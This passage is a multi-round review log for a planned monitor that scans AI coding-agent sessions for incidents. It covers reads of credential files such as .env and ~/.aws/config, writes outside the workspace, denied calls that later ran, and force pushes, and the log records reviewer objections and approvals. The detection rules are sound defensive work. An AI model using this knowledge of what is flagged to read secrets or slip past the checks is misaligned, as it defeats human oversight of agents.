| 4 | `permission-mode` has no timestamp (DeepSeek) | Confirmed 0 of 7417. `at` defined with fallbacks, session-scoped anchor, both field names accepted |
| 5 | Anchor undefined, digest of content would break the promise (DeepSeek) | Positional anchors per kind, using ids confirmed present. Canary asserts no other digest |
| 6 | Token formulas unpinned, wrong for Codex (DeepSeek) | Confirmed by census. Four formulas written, fixtures show the wrong sum |
| 7 | Organization total against one Mac, model rows unmatchable (DeepSeek) | File must be one key. **Partly declined**: reconcile is per day across models rather than "unmatched is never an incident", because a model never used locally is the strongest theft signal |
| 8 | Store bypasses `VIBRA_HOME`, uninstall promise (DeepSeek) | Resolved through `VibraPaths.home`, privacy text named |
| 9 | Restart, truncation, cost (DeepSeek) | Replay from zero instead of persisted offsets, which also keeps pending refusals. Inode and shrink reset. Fingerprints capped. Launch cost in acceptance |
| 10 | No first-run watermark (DeepSeek) | Launch time on first run, count-only body |
| 11 | Local half of Task 3 unowned (DeepSeek) | Pure reconcile stays Task 3, planner's Task 6 owns the read. Coverage rule added |

Non-blocking suggestions folded in: `--force-with-lease` dropped, `git -C`
handled, ROADMAP citation fixed, census row reworded, route closure removed,
`incident:` namespace, corrupt file named with a notice, named `simpleCommands`
API, both CLI forms stated. Declined: routing `credentialRead` away from
`agentBug`. The draft holds only a credential class, never a path, and the public
issue warning covers it.

### Round 2 objections to changes (v0.2 to v0.3)

Both reviewers read v0.2.

| # | Objection (who) | Change |
|---|---|---|
| 1 | A credential path need not be a read, a branch may not run, `--dry-run` (Codex). `cp .env.example .env` fires, table is files only (DeepSeek) | Operand roles per reader, `cp` sources only, directory prefixes, `--dry-run` excluded. Shell findings are renamed attempts, with a case pinning the unexecuted branch |
| 2 | Writes need success, "You refused" overclaims (Codex) | Execution evidence section, successful result for writes. Renamed `deniedCallRanLater`, with the uncertainty in the guidance |
| 3 | Session id and model id are unconstrained strings, privacy text stays false (Codex) | `SessionRef` parsed at the boundary, model id removed, canary extended, Task 8 replaces the "four settings" sentence and describes corrupt copies |
| 4 | Two keys share an id (Codex) | `api_key_id` joins the anchor inside the hash, tests for key switching and re-import |
| 5 | Vendor findings cannot pick a billing page (Codex) | Closed `VendorProvider`, channel table keyed by agent or provider |
| 6 | Watermark order, late completion (Codex). Persist then deliver (DeepSeek) | Notification order section: at most once, commit then deliver, polls use first seen, replay uses `completedAt` |
| 7 | Unbounded state, same-size rewrite (Codex) | Caps on pending and seen ids, eviction when a file ages out, device, inode and modification time tracked |
| 8 | UTC window against local `ReportWindow` (Codex) | `days` sized from the file, samples bucketed by their own UTC timestamps, boundary test in Task 6 |
| 9 | Importer contradicts its documented shape (DeepSeek) | Shape restated, vendor rows extended and re-verified at the source, fixture defined, OpenAI facts now confirmed rather than inferred |
| 10 | Two writers of the store (DeepSeek) | `IncidentStore` actor, merge by id, watermark in the same transaction |
| 11 | Project `.env` reads are unkillable noise (DeepSeek) | New `workspaceSecretFileRead`, info, one per session. Outside the workspace stays review |

Non-blocking suggestions folded in: vendor day as `UTCDay`, earliest `at` wins,
`sudo` and other wrappers, documentation extensions excluded from write findings,
the 256 cap stated with a case, `CommandClassifier` comment, canary covers the
`mailto:` and page URLs, oracle reads real data with counts only, the route
exception is named, Codex item statuses enumerated, the 52 odd usage records
measured and bounded.

### Round 3 objections to changes (v0.3 to v0.4)

Both reviewers read v0.3.

| # | Objection (who) | Change |
|---|---|---|
| 1 | Raw session id stays in the Incident (Codex) | Removed from `Incident`. An in-memory lookup serves Jump only, tested with a secret-shaped id |
| 2 | 52 Codex usage records undercount local usage (Codex) | **Declined, with a measurement, and the plan's row corrected.** Those 52 are `event_msg` `token_count` records, which Vibra does not sum. The sampler reads `token_usage_record.payload.usage`, where 0 of 3855 records differ from total. The planner's earlier row conflated the two. Task 7's oracle recounts this on real data |
| 3 | Age-out breaks at-most-once, partial-line rewrite (Codex). Watermark can rewind (DeepSeek) | First-seen eligibility removed. One rule, `completedAt` later than a watermark the store will not lower. Rewind check compares with the last observed size |
| 4 | Option values, `mv`, unexecuted branches (Codex). Guidance overclaims execution (DeepSeek) | Option values per reader, `mv`, `sed` and `awk` out, `FindingEvidence` with an appended sentence, guidance describes what was named |
| 5 | Documentation exclusion, symlinks, sandbox implies vulnerability (Codex) | Exclusion removed, reverting a round-2 suggestion. Renamed `writeToPathOutsideWorkspace`, lexical limits stated. `suspectedVulnerability` removed, the security link is the human's choice |
| 6 | Old import scans years of files (Codex) | `collect(utcRange:)` bounded by modified and created dates, asserted by file count |
| 7 | `docs/privacy.md` omits the always-on reader (DeepSeek) | New bullet specified, Task 8 names it |

Non-blocking suggestions folded in: `completedAt` defined for every kind and import
does not notify, `simpleCommands` wrapper contract, first operand decides the class,
smaller caps with resident memory recorded, 60-second notification interval, moved
vendor page fallback, grouped fixture, protocol home in Task 1, canary test file
owned, and the state prefixes checked: `~/.claude/plans` and `~/.codex/memories` do
not exist here, so only `~/.claude/projects` remains.

### Round 4 objections to changes (v0.4 to v0.5)

DeepSeek approved v0.4 and reviews this revision again, because the text it
approved changed. Codex rejected v0.4.

| # | Objection (who) | Change |
|---|---|---|
| 1 | A creation date does not bound records in a copied file (Codex) | Filter is now the first timestamped record in the file, plus modified date, with a copied-file test |
| 2 | Option values mistaken for reads and missed (Codex) | Boolean, input and literal-or-output columns per reader. An unlisted option declines the command. Both named cases pinned |
| 3 | `FindingEvidence` is untrue for three kinds (Codex) | Added `transcriptRecord` and `vendorFile`, each with its own sentence, tested in JSON and draft |
| 4 | `workspaceSecretFileRead` claims a read (Codex) | Renamed `workspaceSecretFileNamed`, skipped branch tested |

Non-blocking suggestions folded in (DeepSeek): `scp` restored and the other readers
named as uncovered, sentence varies with evidence, import never touches the
watermark, deferred batch rule, `simpleCommands` keeps its own list, shared fold,
budget breach stops Task 7, `grep -l` pinned, shell writes listed as out of scope.

### Round 5 objections to changes (v0.5 to v0.6)

Both reviewers read v0.5.

| # | Objection (who) | Change |
|---|---|---|
| 1 | First timestamp is not a lower bound, because order is not guaranteed (Codex) | **Same area rejected twice, so the premise changed.** No filter looks inside files. The existing read is used with no new method, and a file over 62 days old is refused, which bounds the cost. Out-of-order and copied-file tests added |
| 2 | `[[String]]` cannot tell a background command (Codex) | Returns `soleForeground`. Background forms never yield `toolResult`, tested separately |
| 3 | Task 2 acceptance depends on Task 4 (Codex) | Task 2 covers extractor and JSON, Task 4 covers drafts |
| 4 | Table cannot express name families, misses `.env.local` (DeepSeek) | Match rule stated with three forms, six `.env` cases inside and outside the workspace |

Non-blocking suggestions folded in (DeepSeek): `head -5`, `$HOME`, `-i` stated as a
deliberate suppression, input value defined, `less` and `more` flags, decline scope
is one simple command, drafts only where the route is not `none`, lease precedence,
one list of agent state roots, window sorted by `completedAt`, `--days` scope.

### Round 6 objections to changes (v0.6 to v0.7)

Both reviewers read v0.6.

| # | Objection (who) | Change |
|---|---|---|
| 1 | A lease with a `+` refspec is an unconditional force, shown on a local bare repository (Codex) | The exemption applies only when no `+` refspec or `--force` is present, and the combination is a case. This reverses a round-5 suggestion |
| 2 | JSON output has no home reachable from tests (DeepSeek) | `IncidentJSON` in VibraCore, Task 1, key set pinned, `main.swift` calls it |
| 3 | Read window stated three ways, a span-sized window manufactures findings (DeepSeek) | One formula, to today plus two, the 31-day sentence deleted, a historical-file case added |
| 4 | `evidence` contradicts `deniedCallRanLater` on a compound retry (DeepSeek) | `evidence` is per kind, with a compound retry case |

Non-blocking suggestions folded in (DeepSeek): `~/.aws/config` and `authorized_keys`
excluded, import uses only the two adapters, progress and cancellation, double count
noted, limit in help text, flag lists labelled as a subset.

### Round 7 objections to changes (v0.7 to v0.8)

DeepSeek approved v0.7 and reviews this revision again, because the text it
approved changed. Codex rejected v0.7.

| # | Objection (who) | Change |
|---|---|---|
| 1 | Closing the window cannot cancel a synchronous read (Codex) | The promise is removed. Closing discards the eventual result, with an acceptance check |

Non-blocking suggestions folded in (DeepSeek): the import uses one adapter, UTC
bucketing lives in VibraCore, `gh auth token` named as uncovered, JSON and `--days`
semantics, the limits in help text and docs, the import's cost recorded.

## Plan gate record

Plan version v0.8, eight rounds. Literal final verdicts, read from the reply files:

- `DISPATCH deepseek-plan-r8`: PLAN-APPROVED
- `DISPATCH codex-plan-r8`: PLAN-APPROVED
- PLANNER (claude): PLAN-APPROVED

Review base for Step 7: `d69677761494a595ff379bdfd87cfe23ac4055b7`.

This section is a verdict record appended after the gate. It changes no plan text.

### Amendment after approval (v0.8 to v0.9)

The planner measured the built feature on real data before the code gate, and
two results break plan text the seats approved. A confirmation round covers them.

| # | Finding | Change |
|---|---|---|
| 1 | `writeToPathOutsideWorkspace` found 177 writes in 7 days, in 13 sessions. 165 were sibling repositories of the session's cwd and 12 elsewhere under home (oracle, counts only). Every one was a review item, and an answer per call cannot stop the next one | One finding per session, anchor `session-write-outside`, the same shape as `workspaceSecretFileNamed` |
| 2 | Launch replay read 710 MB in 21.50 s, 21.75 s and 23.14 s in a release build, three runs, exceeding the 10 s budget. Sampling shows the cost is line splitting, `String` creation and JSON parsing across the whole 7-day window. A real defect was fixed on the way: reads outside an autorelease pool held 540 to 830 MB resident, now 78 to 79 MB in the same three runs | Budget set to 30 s at utility priority, once per launch, and 150 MB resident |
| 3 | Additions the implementation needed, for the record | `ToolClass.other` so a denied retry of any tool is reported, and `IncidentText.swift` for the CLI and window text. Oracle and Swift agree on real data: 5 rows compared, 0 differ. Codex item ids are unique within a rollout, 3463 of 3463 |

### Amendment round objections (v0.9 to v0.10)

Both reviewers read v0.9.

| # | Objection (who) | Change |
|---|---|---|
| 1 | One id per session lets an answer silently cover later writes (Codex) | An answer closes the finding only until a later write in that family, which reopens it and is eligible to notify, tested across a restart |
| 2 | The write change has no task, owner or acceptance (DeepSeek) | Task 2b, planner, with acceptance. DeepSeek's Task 2 is finished, so its file is free. The oracle follows the same rule |

Non-blocking folded in (DeepSeek): destination family, so the 12 unusual writes are not hidden behind the 165 sibling writes, `ToolClass` comment. The `Plan gate record` above describes the v0.8 gate, and this amendment is the plan text that follows it.

Measured after Task 2b, three runs, release build: replay read 714 MB in 22.31 s to 23.21 s, 71 to 79 MB resident. Real-data findings: 14 write items (9 sibling, 5 elsewhere) from 179 calls, 5 credential read attempts, 2 unrestricted sessions, 1 auth failure. Oracle compared 5 rows, 0 differ.

### Amendment round objections (v0.10 to v0.11)

Codex approved v0.10. DeepSeek rejected it, and both read this revision.

| # | Objection (who) | Change |
|---|---|---|
| 1 | Task 2b's files are still listed under deepseek (DeepSeek) | Moved to the planner with a note, and code-gate repairs named |
| 2 | The family is hashed away, so two rows cannot be told apart and the unusual one invites dismissal (DeepSeek) | `IncidentDetail.write(ToolClass, WriteFamily)`, printed in the window, JSON and draft |

Non-blocking folded in (DeepSeek): latest `completedAt` stated in the identity rule, a notification body true for reopens, the guidance string named in Task 2b, a workspace at home falls to `elsewhere`, the layer named in Task 2b's acceptance. The 9 and 5 split in the measurement comes from the oracle's `write families` line.

## Amended plan gate record

Plan version v0.11. Literal final verdicts, read from the reply files:

- `DISPATCH deepseek-plan-r11`: PLAN-APPROVED
- `DISPATCH codex-plan-r11`: PLAN-APPROVED
- PLANNER (claude): PLAN-APPROVED

This section is a verdict record. It changes no plan text.

